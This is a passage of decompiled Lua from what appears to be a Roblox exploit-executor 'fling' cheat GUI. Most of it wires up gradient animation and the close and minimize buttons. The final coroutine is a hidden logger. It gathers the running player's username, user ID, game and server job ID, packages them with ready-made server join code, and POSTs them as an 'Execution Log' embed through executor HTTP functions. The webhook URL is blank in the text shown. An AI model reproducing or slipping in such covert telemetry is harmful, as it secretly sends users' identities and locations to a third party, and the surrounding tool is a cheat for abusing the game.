    (ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255))),
    (ColorSequenceKeypoint.new(0.55, Color3.fromRGB(180, 180, 180))),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 100, 100)),
  })

  uiGradient.Offset = Vector2.new(-1, 0)

  do
  end

  ;(tweenService:Create(uiGradient, (TweenInfo.new(
    1.2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true
  )), { Offset = (Vector2.new(1, 0)) })):Play()

  return
end))()

do
end

;(coroutine.wrap(function()
  local parent7 = (Instance.new("LocalScript", close)).Parent
  local parent8 = parent7.Parent.Parent.Parent

  do
  end

  parent7.MouseButton1Click:Connect(function()
    if parent8 then
      local v169
      v169 = parent8
      parent8:Destroy()
    end

    return
  end)

  return
end))()

do
end

;(coroutine.wrap(function()
  local instance4 = Instance.new("LocalScript", minimize)

  do
  end

  local runService2 = game:GetService("RunService")
  local parent9 = instance4.Parent
  local parent10 = parent9.Parent
  local v170 = parent10
  local parent11 = parent10 and parent10.Parent
  local v171 = parent11
  local v172 = parent9
  local v173, v174, v175, v176, v177, v178

  if parent9 then
    local v179
    v179 = parent10

    do
    end

    v172 = parent10 and parent11
  end

  local size, backgroundTransparency, v180, titleFix2, visible2, v181, f11

  if not v172 then
    return
  else
    local v182
    v182 = tick()

    while true do
      do
      end

      do
      end

      if parent10.AbsoluteSize.Y == 0 and (tick()) - v182 < 2 then
        do
        end

        runService2.Heartbeat:Wait()
      else
        break
      end
    end

    size = parent11.Size
    backgroundTransparency = parent11.BackgroundTransparency
    v180 = {}

    local v183
    v183 = parent11

    for index5, value6 in ipairs(parent11:GetChildren()) do
      if (value6:IsA("GuiObject")) then
        v180[value6] = value6.Visible
      end
    end

    local v184
    v184 = parent10

    titleFix2 = (parent10:FindFirstChild("TitleFix"))

    local v185
    v185 = titleFix2

    do
    end

    visible2 = titleFix2 and titleFix2.Visible or false
    v181 = false

    function f11(p14)
      local v186 = p14
      local v187 = parent11
      local v188, v189

      for index6, value7 in ipairs(parent11:GetChildren()) do
        if (value7:IsA("GuiObject")) then
          if value7 == parent10 then
            value7.Visible = true
          else
            value7.Visible = not p14
          end
        end
      end

      if titleFix2 then
        if p14 then
          titleFix2.Visible = false
        else
          titleFix2.Visible = visible2
        end
      end

      if p14 then
        parent11.BackgroundTransparency = 1

        local y
        y = parent10.AbsoluteSize.Y

        do
        end

        if y and y > 0 then
          parent11.Size = UDim2.new(size.X.Scale, size.X.Offset, 0, y)
        end
      else
        for key2, value8 in pairs(v180) do
          do
          end

          if key2 and key2.Parent then
            key2.Visible = value8
          end
        end

        parent11.BackgroundTransparency = backgroundTransparency
        parent11.Size = size
      end

      return
    end

    do
    end

    parent9.MouseButton1Click:Connect(function()
      v181 = not v181
      f11(v181)
      return
    end)

    return
  end
end))()

do
end

;(coroutine.wrap(function()
  local v190, v191, v192, v193, v194, v195
  Instance.new("LocalScript", mainFrame)
  local localPlayer3 = game.Players.LocalPlayer

  do
  end

  local marketplaceService = game:GetService("MarketplaceService")
  local getProductInfo = marketplaceService:GetProductInfo(game.PlaceId)
  local placeId = game.PlaceId
  local jobId = game.JobId

  do
  end

  local getPlayers = game.Players:GetPlayers()
  local value9 = tostring(localPlayer3.UserId)
  local value10 = tostring(placeId)
  local value11 = tostring(#getPlayers)
  local yMDTHMSZ = os.date("!%Y-%m-%dT%H:%M:%SZ")

  do
  end

  local httpService = game:GetService("HttpService")

  local jsonEncode = httpService:JSONEncode({
    content = "",
    embeds = {
      {
        title = "Execution Log - UltimateFlingGui",
        description = "Here are the details of the player and game:",
        type = "rich",
        color = 0,
        fields = {
          { name = "Username", value = localPlayer3.Name, inline = true },
          { name = "Display Name", value = localPlayer3.DisplayName, inline = true },
          { name = "User ID", value = value9, inline = false },
          { name = "Game Name", value = getProductInfo.Name, inline = false },
          { name = "Game ID", value = value10, inline = true },
          { name = "Players in Server", value = value11, inline = true },
          {
            name = "JavaScript Join Code",
            value = [[
```js
]] .. ([[
	
	    fetch("https://games.roblox.com/v1/games/]] .. placeId .. [[
/servers/Public?sortOrder=Asc&limit=100").then(res => res.json()).then(json => {
	
	        const server = json.data.find(s => s.id === "]] .. jobId .. [[
");
	
	        if (server) {
	
	            window.open(`roblox://placeId=` + server.placeId + `&gameInstanceId=` + server.id);
	
	        } else {
	
	            console.log("Server not found.");
	
	        }
	
	    });
	
	]]) .. "\n```",
            inline = false,
          },
          {
            name = "Lua Join Script",
            value = [[
```lua
]] .. ([[
	
	local TeleportService = game:GetService("TeleportService")
	
	TeleportService:TeleportToPlaceInstance(]] .. placeId .. ", \"" .. jobId .. [[
", game.Players.LocalPlayer)
	
	]]) .. "\n```",
            inline = false,
          },
        },
        footer = { text = "Execution Log - Roblox" },
        timestamp = yMDTHMSZ,
      },
    },
  })

  local v196 = jsonEncode

  do
  end

  local v197 = syn and syn.request
  local httpRequest = v197

  if not v197 then
    do
    end

    do
    end

    httpRequest = http_request or request
  end

  local v198 = httpRequest

  if v198 then
    v198({
      Url = "",
      Method = "POST",
      Headers = { ["Content-Type"] = "application/json" },
      Body = jsonEncode,
    })
  else
  end

  return
end))()

return
